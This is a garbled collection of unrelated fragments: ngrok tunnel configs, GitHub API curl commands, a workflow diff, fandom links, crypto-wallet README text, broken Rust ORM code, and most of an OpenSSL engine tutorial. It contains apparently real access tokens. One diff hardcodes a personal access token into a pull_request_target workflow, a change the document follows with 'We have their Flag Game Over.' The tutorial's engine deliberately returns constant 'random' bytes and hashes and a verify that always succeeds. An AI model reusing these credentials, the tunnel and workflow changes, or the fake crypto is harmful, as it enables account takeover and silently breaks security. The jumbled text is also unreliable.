authtoken: 2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD

ngrok tunnel --region us --label edge=edgtcp_2asv5WFM8HsADOTMkpzdtM0KrpL 22

ngrok config edit

version: 2 authtoken: 2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD region: us tunnels: my_tunnel_name: labels: - edge=edgtcp_2asv5WFM8HsADOTMkpzdtM0KrpL addr: 22

ngrok start your_tunnel_name ngrok start --all

bkdtg_2asv5U5hELWSH2oxgWcMSqfmDPI tunnel group id

1.tcp.ngrok.io:{port} https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator

$ NGROK + Netify Infomatics Developer Token eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3BvcnRhbC5uZXRpZnkuYWkvbG9naW4iLCJpYXQiOjE3MDUxMzY4MzUsImV4cCI6MTcwNTc0MTYzNSwibmJmIjoxNzA1MTM2ODM1LCJqdGkiOiJ5YUJSNmVaNHowazdmeWVPIiwicm9sZXMiOlsidXNlciJdfQ.D76SvBw4n1cE-uvKaXgEQejvT4lFtYTVI_CI3rfW9jE

'cert_2arwYf0cqnJGX9y1yw4Ky2ZQRAe' $ certificate code

'ak_2atI9ikJZKro4NLf7fnt2yV6RNd' API Key Code

'dfb33af7_fa5a_4920_a4d4_e7742b2732460' $ orginization (God's Time Travel Corporation) UUID

'e8197a53-28ed-4f30-82ac-2443940739b8' $ Personal Soul Profile UUID

https://api.github.com/repos/OWNER/REPO/branches/BRANCH/protection/restrictions/apps -d '{"apps":["octoapp"]}' curl -L -H "Accept: application/vnd.github+json" -H "Authorization: Bearer <2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs>" -H "X-GitHub-Api-Version: 2022-11-28" https://api.github.com/repos/OWNER/REPO/branches/BRANCH/protection/restrictions/users curl -L -X DELETE -H "Accept: application/vnd.github+json" -H "Authorization: Bearer <2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs>" -H "X-GitHub-Api-Version: 2022-11-28" https://api.github.com/repos/OWNER/REPO/keys/KEY_ID curl -L -H "Accept: application/vnd.github+json" -H "Authorization: Bearer <2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs>" -H "X-GitHub-Api-Version: 2022-11-28" https://api.github.com/repos/OWNER/REPO/keys/KEY_ID https://static.wikia.nocookie.net/memoryalpha/images/c/c5/Sol.jpg/revision/latest?cb=20100201220855&path-prefix=en&mobile-app=true&theme=false

https://github.com/brave/brave-browser.wiki.git

const keyring = new YourKeyringClass(options);

npm install eth-keyring-controller --save

Usage

const KeyringController = require('eth-keyring-controller') const SimpleKeyring = require('eth-simple-keyring')

const keyringController = new KeyringController({ keyringTypes: [SimpleKeyring], // optional array of types to support. initState: initState.KeyringController, // Last emitted persisted state. encryptor: { // An optional object for defining encryption schemes: // Defaults to Browser-native SubtleCrypto. encrypt (password, object) { return new Promise('encrypted!') }, decrypt (password, encryptedString) { return new Promise({ foo: 'bar' }) }, }, })

// The KeyringController is also an event emitter: this.keyringController.on('newAccount', (address) => { console.log(New account created: ${address}) }) this.keyringController.on('removedAccount', handleThat) Methods

Currently the methods are heavily commented in the source code, so it's the best place to look until we aggregate it here as well.

GRATEFUL-004W NetBIOS name GRATEFUL-004W is currently being used Workgroup

GRATEFUL"S NET

https://static.wikia.nocookie.net/memoryalpha/images/4/4a/Starfleet_Command_signage_logo%2C_2360s.png/revision/latest?cb=20200531220214&path-prefix=en

"https://signalis.fandom.com/wiki/ADMINISTRATOR%27S_KEY"

https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator

https://upload.wikimedia.org/wikipedia/commons/8/83/RIAA_logo_colored.svg

{ "name": "sigma-theme", "description": "SCP Wiki site theme (build process)", "version": "1.0.0", "authors": "SCP Wiki Technical Team", "license": "CC-BY-SA-3.0", "private": true, "repository": { "type": "git", "url": "https://github.com/scpwiki/sigma" }, "devDependencies": { "minify": "^9.2.0", "prettier": "^2.8.7", "stylelint": "^15.10.1", "stylelint-config-standard": "^32.0.0" }, "scripts": { "build": "./build.sh", "clean": "rm -rf dist", "minify": "minify sigma.css > dist/css/sigma.min.css", "stylelint": "stylelint sigma.css", "stylelint:fix": "stylelint --fix sigma.css", "prettier": "prettier -c sigma.css", "prettier:fix": "prettier -w sigma.css" } } semi = true semi = true singleQuote = true singleQuote = true quoteProps = "consistent" quoteProps = "consistent" 29,878 changes: 11,965 additions & 17,913 deletions 29,878
ReadMe.md → ReadMe.crt

11,965 additions, 17,913 deletions not shown because the diff is too large. Please use a local Git client to view these changes. 20 changes: 18 additions & 2 deletions 20
build.sh

@@ -25,7 +25,7 @@ jobs: steps: steps: - uses: actions/labeler@v4 - uses: actions/labeler@v4 with: with: repo-token: ${{ secrets.GITHUB_TOKEN }} repo-token: ${{ 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 }}

name: Pull request labeler name: Pull request labeler on: [ pull_request_target ] on: [ pull_request_target ] @@ -39,6 +39,22 @@ jobs: steps: steps: - uses: actions/labeler@v4 - uses: actions/labeler@v4 with: with: repo-token: ${{ secrets.GITHUB_TOKEN }} repo-token: ${{ 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 }}

      curl --location 'https://informatics.netify.ai/api/v2/lookup/signatures/applications?settings_version=4.2.5&settings_format=normal'
--header '2b0kkNvjIBFuBl15nGxtnMd5B3P_37bwJDJ2GYRMTicczqhEG' curl --request POST --url "https://api.github.com/applications/YOUR_CLIENT_ID/token" --user "e77a119a5fbd3e2942dc" --header "Accept: application/vnd.github+json" --header "X-GitHub-Api-Version: 2022-11-28" --data '{ "access_token": "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" }'

jobs: use_api: runs-on: ubuntu-latest permissions: {} steps: - env: GH_TOKEN: ${{ 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 }} run: | gh api /

We have their Flag Game Over.

++ Sigma 9 ++

      #000006 $ Breadcrumbs X 4
$ pip install panoramix-decompiler /// Method to call to perform AUTOINCREMENT operation on a Primary Kay fn auto_increment() -> bool; /// Method to map a primary key to a column in an Entity fn into_column(self) -> Self::Column;

/// Method to map a primary key from a column in an Entity fn from_column(col: Self::Column) -> Option where Self: Sized; #[derive(Clone, Debug, PartialEq, DeriveEntityModel)] #[sea_orm(table_name = "primary_key_of_1")] pub struct Model { #[sea_orm(primary_key)] pub id: i32, pub owner: String, pub name: String, pub description: String, }

    #[derive(Copy, Clone, Debug, EnumIter, DeriveRelation)]
    pub enum Relation {}

    impl ActiveModelBehavior for ActiveModel {}
}

mod primary_key_of_2 {
    use crate as sea_orm;
    use crate::entity::prelude::*;

    #[derive(Clone, Debug, PartialEq, DeriveEntityModel)]
    #[sea_orm(table_name = "primary_key_of_2")]
    pub struct Model {
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_1: i32,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_2: String,
        pub owner: String,
        pub name: String,
        pub description: String,
    }

        #[sea_orm(primary_key, auto_increment = false)]
        pub id_2: DeriveCategory,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_3: Date,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_4: DateTime,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_5: Time,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_6: TimeTime,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_7: DateTime,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_8: TimeDateTime,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_9: DateTimeLocal,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_10: DateTimeUtc,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_11: DateTimeWithTimeZone,
        pub owner: String,
        pub name: String,
        pub description: String,
    }

    #[derive(Copy, Clone, Debug, EnumIter, DeriveRelation)]
    pub enum Relation {}

    impl ActiveModelBehavior for ActiveModel {}
}

mod primary_key_of_12 {
    use crate as sea_orm;
    use crate::entity::prelude::*;

    #[derive(Clone, Debug, PartialEq, DeriveEntityModel)]
    #[sea_orm(table_name = "primary_key_of_12")]
    pub struct Model {
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_1: String,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_2: i8,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_3: u8,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_4: i16,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_5: u16,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_6: i32,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_7: u32,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_8: i64,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_9: u64,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_10: f32,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_11: f64,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_12: bool,
        pub owner: String,
        pub name: String,
        pub description: String,
    }

    #[derive(Copy, Clone, Debug, EnumIter, DeriveRelation)]
    pub enum Relation {}

    impl ActiveModelBehavior for ActiveModel {}
}
} $ WEB3_PROVIDER_URI=http://localhost:7545 panoramix 0x0d94D81FD712126E7f320b5B10537D01d6a01563 $ panoramix 6004600d60003960046000f30011223344 From d2ba91c135cbf290c2da04cc2497d09f1c1f12ce Mon Sep 17 00:00:00 2001 From: GOD/GRATEFUL MIB OPERATOR 6309304695z@gmail.com Date: Tue, 30 Jan 2024 11:20:36 -0600 Subject: [PATCH] Update ReadMe.md MIME-Version: 1.0 Content-Type: text/plain; charset=UTF-8 Content-Transfer-Encoding: 8bit

sudo ln –s ~/workspace/oezganEngine/Debug/liboezganengine.so liboezgan.so You can also copy the compiled shared library into the /usr/lib/engines/ directory but this should be done when the engine is ready to be deployed.You can find the OpenSSL include files in /usr/include/openssl. Beginning

We will start with implementing an engine which only has its name and nothing else. The oezganEngine.c file: #include <openssl/engine.h> static const char *engine_oezgan_id = "oezgan"; static const char *engine_oezgan_name = "oezgan engine by Fraunhofer FKIE";

IMPLEMENT_DYNAMIC_CHECK_FN(); IMPLEMENT_DYNAMIC_BIND_FN(bind_helper);

int oezgan_init(ENGINE *e) { printf("Oezgan Engine Initializatzion!\n"); return 786; }

int bind_helper(ENGINE * e, const char *id) { if (!ENGINE_set_id(e, engine_oezgan_id) || !ENGINE_set_name(e, engine_oezgan_name) || !ENGINE_set_init_function(e,oezgan_init) ) return 0;

return 1;
}

and the tester oezganEngineTester.cc file: #include <openssl/engine.h> #include <stdio.h> #include <string.h>

int main(int argc, const char* argv[] ) { OpenSSL_add_all_algorithms();

ERR_load_crypto_strings();

ENGINE_load_dynamic();
ENGINE *oezgan_engine = ENGINE_by_id("oezgan");

if( oezgan_engine == NULL )
{
    printf("Could not Load Oezgan Engine!\n");
    exit(1);
}
printf("Oezgan Engine successfully loaded\n");

int init_res = ENGINE_init(oezgan_engine);
printf("Engine name: %s init result : %d \n",ENGINE_get_name(oezgan_engine), init_res);
return 0;
}

Note that we use a c++ file to test the engine. Running the tester gives us the following result: oezgan@kehf-dev1:~/workspace3/oezganEngineTester/Debug$ ./oezganEngineTester Oezgan Engine successfully loaded Oezgan Engine Initializatzion! Engine name: oezgan engine by Fraunhofer FKIE init result : 786 Our engine is successfully loaded and when it`s asked it gives back its name. Now we proceed by implementing our own random function. Cleanup memory leaks For OpenSSL version prior to 1.1.0, users are required to call ENGINE_cleanup, EVP_cleanup, etc. to prevent memory leak. See Library Initialization page. For OpenSSL version 1.1.0 and 1.1.1, cleanup happens automatically, users should not worry about it. ENGINE_set_finish_function & ENGINE_set_destroy_function are still available to do implementation specific cleanup. The Random Function

OpenSSL has its own method declarations which our engine has to comply with. In the header file ossl_typ.h we find the declaration s: typedef struct rand_meth_st RAND_METHOD; typedef struct ecdh_method ECDH_METHOD; typedef struct ecdsa_method ECDSA_METHOD; For now we are only interested in the RAND_METHOD declaration. The RAND_METHOD declaration is actually a macro for the rand_method_st declaration which can be found in rand.h of the OpenSSL includes. Here we see that the rand_method_st has the following format: struct rand_meth_st { void (*seed) (const void *buf, int num); int (*bytes) (unsigned char *buf, int num); void (*cleanup) (void); void (*add) (const void *buf, int num, double entropy); int (*pseudorand) (unsigned char *buf, int num); int (*status) (void); }; Thus we see that the OpenSSL random method structure defines six functions where the headers of these functions have specific formats. For simplicity purposes we will only implement the “bytes” and the “status” methods. The status method should return an integer and takes no arguments. Presumably this method is used for indication of the state of the random machine. Our engine`s random machine has no states, therefore we only return a positive integer to indicate a thumbs up state. The random status method: int oezgan_random_status(void) { return 1; } Now we implement our own method for generating a number of random bytes as follows: //new includes #include <string.h> #include <openssl/ossl_typ.h>

int get_random_bytes(unsigned char buffer, int num) { printf("oezgan engine random length %d\n", num); memset(buffer,1,num); return 99; } This method will fill the given buffer with num many ones. Now we indicate our random machine structure as: RAND_METHOD oezgan_random_method = { NULL, / seed / get_random_bytes, NULL, / cleanup / NULL, / add */ NULL, oezgan_random_status }; We also modify the bind_helper function from above: int bind_helper(ENGINE * e, const char *id) { if (!ENGINE_set_id(e, engine_oezgan_id) || !ENGINE_set_name(e, engine_oezgan_name) || !ENGINE_set_init_function(e, oezgan_init) || !ENGINE_set_RAND(e, &oezgan_random_method) ) return 0; return 1; } In the tester we add the following lines: ENGINE_set_default_RAND(oezgan_engine);

unsigned char * rand_buf= new unsigned char[5]; int err = RAND_bytes(rand_buf,5); for(int i= 0; i < 5; i++) { printf("%x",rand_buf[i]); } printf("\n"); free(rand_buf); The result is seen below: oezgan@kehf-dev1:~/workspace3/oezganEngineTester/Debug$ ./oezganEngineTester Oezgan Engine successfully loaded Oezgan Engine Initializatzion! Engine name: oezgan engine by Fraunhofer FKIE init result : 786 oezgan engine random length 5 11111 We now successfully implemented an OpenSSL engine that gives always returns a lot of 1s as random values. Digests

Now we want OpenSSL not only to use our own random function but also to use our sha2 family hash functions. We first implement a digest selector function, which tells OpenSSL which digests are available in our engine. This kind of implementation is adapted from the OpenSSL`s build-in engine ccghost. We will implement only one hash function namely SHA256. Following the the ossl_typ.h header to the evp.h header one can see that the Message Digest Structure is defined as follows: struct env_md_st { int type; int pkey_type; int md_size; unsigned long flags; int (*init) (EVP_MD_CTX *ctx); int (*update) (EVP_MD_CTX *ctx, const void *data, size_t count); int (*final) (EVP_MD_CTX *ctx, unsigned char *md); int (*copy) (EVP_MD_CTX *to, const EVP_MD_CTX *from); int (*cleanup) (EVP_MD_CTX ctx); / FIXME: prototype these some day */ int (*sign) (int type, const unsigned char *m, unsigned int m_length, unsigned char *sigret, unsigned int *siglen, void *key); int (*verify) (int type, const unsigned char *m, unsigned int m_length, const unsigned char *sigbuf, unsigned int siglen, void key); int required_pkey_type[5]; / EVP_PKEY_xxx / int block_size; int ctx_size; / how big does the ctx->md_data need to be / / control function */ int (*md_ctrl) (EVP_MD_CTX *ctx, int cmd, int p1, void p2); } / EVP_MD / ; (Commentaries are original form OpenSSL code). From this we use our own message digest hash SHA256 declaration: static EVP_MD oezgan_engine_sha256_method= { NID_sha256, NID_undef, 32, EVP_MD_FLAG_PKEY_METHOD_SIGNATURE, oezgan_engine_sha256_init, oezgan_engine_sha256_update, oezgan_engine_sha256_final, oezgan_engine_sha256_copy, oezgan_engine_sha256_cleanup, / FIXME: prototype these some day / NULL, NULL, {NID_undef, NID_undef, 0, 0, 0}, 64, /Block Size/ 32, / how big does the ctx->md_data need to be / / control function / NULL, } ; SHA256 uses a block size of 512 Bit = 64 byte and resulting digest is 256 Bit = 32 byte long. You can also use your own block size and outcome size but for a realistic approach we stick to the original sha256 standard. Now we need to implement the init, update, final and copy functions for our own sha256 implementation. In our implementation the SHA256 Value is always 2222… Note Since 1.1.0, EVP_MD cannot be directly accessed. Users have to call EVP_MD_meth_new to get EVP_MD instance, and use EVP_MD_meth_set_ to set functions and properties list above. OID and NID In above example, we reused sha256's nid. For those who want to implement new algorithms, use OBJ_create to create new nid and OBJ_*2nid to translate names to nids. static int oezgan_engine_sha256_init(EVP_MD_CTX *ctx) { ctx->update = &oezgan_engine_sha256_update; printf("initialized! SHA256\n"); return 1; }

static int oezgan_engine_sha256_update(EVP_MD_CTX *ctx,const void data,size_t count) { printf("SHA256 update \n"); unsigned char * digest256 = (unsigned char) malloc(sizeof(unsigned char)*32); memset(digest256,2,32); count = 32; ctx->md_data = digest256; return 1; }

static int oezgan_engine_sha256_final(EVP_MD_CTX *ctx,unsigned char md) { printf("SHA256 final size of EVP_MD: %d\n", sizeof(EVP_MD)); memcpy(md,(unsigned char)ctx->md_data,32); return 1; }

int oezgan_engine_sha256_copy(EVP_MD_CTX *to, const EVP_MD_CTX *from) { printf("Copy SHA256\n"); if (to->md_data && from->md_data) { memcpy(to->md_data, from->md_data,sizeof(from->md_data)); } return 1; }

static int oezgan_engine_sha256_cleanup(EVP_MD_CTX *ctx) { printf("SHA256 cleanup\n"); if (ctx->md_data) memset(ctx->md_data, 0, 32); return 1; } Now we have to tell OpenSSL that whenever a SHA256 digest is requested use the engine implementation of sha256 this will be the digest selector function. static int oezgan_digest_ids[] = {NID_sha256};

static int oezgan_engine_digest_selector(ENGINE *e, const EVP_MD **digest, const int **nids, int nid) { int ok = 1; if (!digest) { *nids = oezgan_digest_ids; printf("\n Digest is empty! Nid:%d\n", nid); return 2; } printf("Digest no %d requested\n",nid); if (nid == NID_sha256) { *digest = &oezgan_engine_sha256_method; } else { ok = 0; *digest = NULL; } return ok; } We also need to modify the bind_helper function again: int bind_helper(ENGINE * e, const char *id) { if (!ENGINE_set_id(e, engine_oezgan_id) || !ENGINE_set_name(e, engine_oezgan_name) || !ENGINE_set_RAND(e, &oezgan_random_method) || !ENGINE_set_init_function(e, oezgan_init) || !ENGINE_set_digests(e, &oezgan_engine_digest_selector) ) return 0; return 1; } And we modify our tester to generate us a SHA256 Hash function. char * str = "Fraunhofer FKIE Wachtberg!"; int str_len = 26; int er = ENGINE_set_default_digests(oezgan_engine); printf("ENGINE SETTING DEFAULT DIGESTS %d\n",er);

unsigned char * digest = new unsigned char[32];
unsigned int digestSize = -1;

EVP_MD_CTX *evp_ctx;
evp_ctx = EVP_MD_CTX_create();
er = EVP_DigestInit_ex(evp_ctx, EVP_sha256(),oezgan_engine);
printf("Digest INIT %d\n",er);
er = EVP_DigestUpdate(evp_ctx, (unsigned char*)str, str_len);
printf("Digest Update %d\n",er);
er = EVP_DigestFinal(evp_ctx, digest, &digestSize);
printf("Digest Final %d Digest size:%d\n",er,digestSize);
for(int i= 0; i< digestSize; i++) {
    printf("%x", digest[i]);
}
printf("\n");
EVP_MD_CTX_destroy(evp_ctx);
The result is: oezgan@kehf-dev1:~/workspace3/oezganEngineTester/Debug$ ./oezganEngineTester Oezgan Engine successfully loaded Oezgan Engine Initializatzion! Engine name: oezgan engine by Fraunhofer FKIE init result : 786 oezgan engine random length 5 11111 ENGINE SETTING DEFAULT DIGESTS 1 initialized! SHA256 Digest INIT 1 SHA256 update Digest Update 1 SHA256 final size of EVP_MD: 76 SHA256 cleanup Digest Final 1 Digest size:32 22222222222222222222222222222222 Similarly one can also implement other digest functions. Now we move on to more complicated things like the ECDSA or the ECDH algorithms. ECDH

We now want to use our own Elliptic Curve Diffie-Hellman Key Agreement function. This is a little bit different from what we have seen above. We get us the definition of the ECDH method structe from the file crypto/ecdh/ecdh.h the definition which is provided in this file is not included in the OpenSSL headers, therefore we have to put it in a new header file which will be included in our engine. The file oezganEngine.h: #ifndef OEZGANENGINE_H_ #define OEZGANENGINE_H_ #ifdef __cplusplus extern "C" { #endif

struct ecdh_method { const char *name; int (*compute_key) (void *key, size_t outlen, const EC_POINT *pub_key, EC_KEY *ecdh, void *(*KDF) (const void *in, size_t inlen, void *out, size_t *outlen));

if 0

int (*init) (EC_KEY *eckey);
int (*finish) (EC_KEY *eckey);
endif

int flags;
char *app_data;
};

#ifdef __cplusplus } #endif

#endif /* OEZGANENGINE_H_ */ KDF is the Key Derivation Function which will be NULL here. Now we add the following declaration in to our oezganEngine.c file: ECDH_METHOD oezgan_ecdh_method = { "Oezgan Engine ECDH Method", oezgan_engine_compute_ecdh_key,

if 0

    NULL,
    NULL,
endif

    0,
    NULL,
}; And the implementation of the ECDH method: static int oezgan_engine_compute_ecdh_key(void * key, size_t outlen, const EC_POINT *pubkey, EC_KEY *eckey, void *(*oezgan_ecdh_kdf) (const void *in, size_t inlen, void *out, size_t *outlen)) { printf("Oezgan Engine ECDH Method\n");

EC_GROUP *group = EC_KEY_get0_group(eckey);
//convert pubkey
int pubkey_len = EC_POINT_point2oct(group, pubkey,
                        POINT_CONVERSION_UNCOMPRESSED,
                          NULL, 0, NULL);
unsigned char * pubkey_buf = malloc(sizeof(unsigned char)*pubkey_len);
pubkey_len = EC_POINT_point2oct(group, pubkey,
                        POINT_CONVERSION_UNCOMPRESSED,
                         pubkey_buf, pubkey_len, NULL);

//convert private key
const BIGNUM* prikey_bn = BN_new();
prikey_bn = EC_KEY_get0_private_key(eckey);
int privkey_len =  BN_num_bytes(prikey_bn);
unsigned char * privkey_buf = malloc(sizeof(unsigned char)*privkey_len);
BN_bn2bin(prikey_bn, privkey_buf);

memset(key,3,pubkey_len);
outlen = pubkey_len;

free(privkey_buf);
free(pubkey_buf);

printf("Oezgan engine ECDH method End returning: %d!\n", outlen);

return outlen;
} Our implementation of the ECDH Method copies the public key into an unsigned char array pubkey also the private key is converted into an unsigned char array for demonstration purposes since a real ECDH implementation has to calculate the from the values bP = B and aP=A the value abP where a and b are the secret keys of two users Aylin and Boris respectively and P is the base point on the elliptic curve. Again we modify our bind_helper method as follows: int bind_helper(ENGINE * e, const char *id) { if (!ENGINE_set_id(e, engine_oezgan_id) || !ENGINE_set_name(e, engine_oezgan_name) || !ENGINE_set_RAND(e, &oezgan_random_method) || !ENGINE_set_init_function(e, oezgan_init) || !ENGINE_set_digests(e, &oezgan_engine_digest_selector) || !ENGINE_set_ECDH(e, &oezgan_engine_ecdh_method) ) return 0; return 1; } To be able to test this we need a certificate file and the corresponding private key file. There are many guides in the internet how to generate such certificates and private key pairs. Later on we will need that certificate file to test our ECDSA methods. The test program will now read in a private key file “ownPrivkey.pem” and try to establish an ECDH key with its own public key. The result will be a lot of 3s, exactly as many as the length of the public key. In our certificate file we use a brainpoolP384r1 curve as well as for the ECDH. Beware that the brainpool curves are not supported in OpenSSL versions < 1.0.2. You can use default NIST Curves such as the secp384r1 instead. The following is added to the tester: //includes #include <openssl/engine.h> #include <openssl/crypto.h> #include <openssl/evp.h> #include <openssl/pem.h> #include <stdio.h> #include <string.h>

er = ENGINE_set_default_ECDH(oezgan_engine); printf(" %d\N ",er);

FILE* fp = fopen("./ownPrivkey.pem", "r"); if (fp == NULL) { printf( "Could not open private key file\N"); exit(1); } EVP_PKEY *privateKey; privateKey= PEM_read_PrivateKey(fp, NULL, 0, NULL); if ((privateKey) == NULL) { printf("Could not extract private key from file\N"); exit(1); } fclose(fp);

EC_KEY *eckey; eckey = EC_KEY_new(); ECDSA_SIG * ecdsa_sig; ecdsa_sig = ECDSA_SIG_new(); eckey = EVP_PKEY_get1_EC_KEY(privateKey);

EC_GROUP ec_group; ec_group = EC_GROUP_new_by_curve_name(NID_brainpoolP384r1); const EC_POINT pub_key; pub_key = EC_KEY_get0_public_key(eckey);

unsigned char agreed_value[200]; EC_KEY *ecdh; ecdh = EC_KEY_new(); EC_KEY_set_group(ecdh, ec_group); er = EC_KEY_set_private_key(ecdh, EC_KEY_get0_private_key(eckey));

int agreed_value_len = ECDH_compute_key(agreed_value, 200,pub_key, ecdh, NULL);

printf("Oezgan engine Agreed Value: %d\n",agreed_value_len); for(int i= 0; i < agreed_value_len; i++) { printf("%x", agreed_value[i]); } printf("\n"); Running the tester results in: oezgan@kehf-dev1:~/workspace3/oezganEngineTester/Debug$ ./oezganEngineTester Oezgan Engine successfully loaded Oezgan Engine Initializatzion! Engine name: oezgan engine by Fraunhofer FKIE init result : 786 oezgan engine random length 5 11111 ENGINE SETTING DEFAULT DIGESTS 1 initialized! SHA256 Digest INIT 1 SHA256 update Digest Update 1 SHA256 final size of EVP_MD: 76 SHA256 cleanup Digest Final 1 Digest size:32 22222222222222222222222222222222 ENGINE SETTING DEFAULT ECDH: 1 Oezgan Engine ECDH Method Oezgan engine ECDH method End returning: 97! Oezgan engine Agreed Value: 97 3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333 ECDSA

Now we implement our own ECDSA Algorithm in our engine. Similar to ECDH we need to copy a definition of the ECDSA Method structure. This method structure is found in the crypto/ecdsa/ecs_locl.h file. The Structure: struct ecdsa_method { const char *name; ECDSA_SIG *(*ecdsa_do_sign) (const unsigned char *dgst, int dgst_len, EC_KEY *eckey); int (*ecdsa_sign_setup) (EC_KEY *eckey, BN_CTX *ctx, BIGNUM **kinv, BIGNUM **r); int (*ecdsa_do_verify) (const unsigned char *dgst, int dgst_len, const ECDSA_SIG *sig, EC_KEY *eckey);

if 0

int (*init) (EC_KEY *eckey);
int (*finish) (EC_KEY *eckey);
endif

int flags;
void *app_data;
}; We add this declaration into the oezganEngine.h file. The complete .h file is shown below: #ifndef OEZGANENGINE_H_ #define OEZGANENGINE_H_

#ifdef __cplusplus extern "C" { #endif

struct ecdh_method { const char *name; int (*compute_key) (void *key, size_t outlen, const EC_POINT *pub_key, EC_KEY *ecdh, void *(*KDF) (const void *in, size_t inlen, void *out, size_t *outlen));

if 0

int (*init) (EC_KEY *eckey);
int (*finish) (EC_KEY *eckey);
endif

int flags;
char *app_data;
};

struct ecdsa_method { const char *name; ECDSA_SIG *(*ecdsa_do_sign) (const unsigned char *dgst, int dgst_len, EC_KEY *eckey); int (*ecdsa_sign_setup) (EC_KEY *eckey, BN_CTX *ctx, BIGNUM **kinv, BIGNUM **r); int (*ecdsa_do_verify) (const unsigned char *dgst, int dgst_len, const ECDSA_SIG *sig, EC_KEY *eckey);

if 0

int (*init) (EC_KEY *eckey);
int (*finish) (EC_KEY *eckey);
endif

int flags;
void *app_data;
}; As we can see the ECDSA method structure needs at least 3 functions, the setup function the signing function and the verifying function. Similar to the ECDH section we define our methods in our oezganEngine.c file: static ECDSA_METHOD oezgan_engine_ecdsa_method = { "Oezgan engine ECDSA method", oezgan_engine_ecdsa_sign, oezgan_engine_ecdsa_sign_setup, oezgan_engine_ecdsa_do_verify,

if 0

    NULL,                       /* init */
    NULL,                       /* finish */
endif

    0,                          /* flags */
    NULL                        /* app_data */
} We also add our signing, verifying and setup functions to the oezganEngine.c file: int oezgan_engine_ecdsa_sign_setup (EC_KEY *eckey, BN_CTX *ctx_in, BIGNUM **kinvp, BIGNUM **rp) { return 1; } static ECDSA_SIG *oezgan_engine_ecdsa_sign (const unsigned char *dgst, int dgst_len, const BIGNUM *kinv, const BIGNUM *rp, EC_KEY *in_eckey) { printf("oezgan engine ecdsa sign digest \n"); unsigned char * out_sig; out_sig = malloc(sizeof(unsigned char)64); int sig_len = 0; //convert privatekey int pkeyLen = i2d_ECPrivateKey(in_eckey,NULL); const BIGNUM bignum = EC_KEY_get0_private_key(in_eckey); int pkeyLen; unsigned char *ucBuf, *uctempBuf; pkeyLen = BN_bn2mpi(bignum, NULL); ucBuf = (unsigned char *)malloc(pkeyLen+1); uctempBuf = ucBuf; //Note that this function modifies the uctempBuf as // uctempBuf = uctempBuf + pkeyLen BN_bn2mpi(bignum, uctempBuf); memset(ucBuf,4,pkeyLen); sig_len = pkeyLen;

ECDSA_SIG * ret_sig;
ret_sig = d2i_ECDSA_SIG(NULL,&out_sig,sig_len);
out_sig -= sig_len;
return ret_sig;
}

int oezgan_engine_ecdsa_do_verify (const unsigned char *digest, int digest_len, const ECDSA_SIG *ecdsa_sig, EC_KEY *eckey) { printf("oezgan engine verifying function\n"); int res = 0; int er = 0; //convert ECDSA_SIG to unsigned char int sig_len = i2d_ECDSA_SIG(ecdsa_sig,NULL); unsigned char * sign = malloc(sizeof(unsigned char)*sig_len); er = i2d_ECDSA_SIG(ecdsa_sig,&sign); sign -= sig_len;

//convert EC_Key to unsigned char

int pubkey_len = i2o_ECPublicKey(eckey,NULL);
unsigned char* pubkey = malloc(sizeof(unsigned char)*pubkey_len);
er = i2o_ECPublicKey(eckey,&pubkey);
pubkey -= er;
if(er == 0) {
    printf("\n Could not convert EC_KEY error:%d\n",er);
    return er;
}
res =99;
printf("oezgan ecdsa verfiy end! result %d\n",res);
return res;
} Our setup function does basically nothing. It always returns 1. You can also use the default implementation of the ECDSA sign setup method located in the file crypto/ecdsa/ecs_ossl.c in the source directory of OpenSSL. We can’t do much in our signing function without a proper signing algorithm, since the return value type ECDSA_SIG needs to be a DER encoded elliptic curve digital signature which consists of a pair (r,s). Therefore our ecdsa implementation returns 0 as the size of the signature and no signature at all. The verifying function always returns 99 independent of the data provided. The conversions in these methods are made for demonstration purposes, to give the reader a rough idea about implementing his or her own algorithms. List of conversions done: Finally we modify our bind_helper function again as follows: int bind_helper(ENGINE * e, const char *id) { if (!ENGINE_set_id(e, engine_oezgan_id) || !ENGINE_set_name(e, engine_oezgan_name) || !ENGINE_set_RAND(e, &oezgan_random_method) || !ENGINE_set_init_function(e, oezgan_init) || !ENGINE_set_digests(e, &oezgan_engine_digest_selector) || !ENGINE_set_ECDH(e, &oezgan_engine_ecdh_method) || !ENGINE_set_ECDSA(e, &oezgan_engine_ecdsa_method) ) return 0; return 1;+ } To test this we also need a certificate file noted here as “ownCert.pem”. Then we add the following lines to our test program:

er = ENGINE_set_default_ECDSA(oezgan_engine);
printf("\nENGINE SETTING DEFAULT ECDSA:%d\n",er);

unsigned char *sig = new unsigned char[256];
unsigned int sigsize;
ECDSA_sign(0,digest,digestSize,sig,&sigsize,eckey);
printf("Signature size:%d \n",sigsize);
for(int i=0; i <sigsize;i++) {
    printf("%x",sig[i]);
}
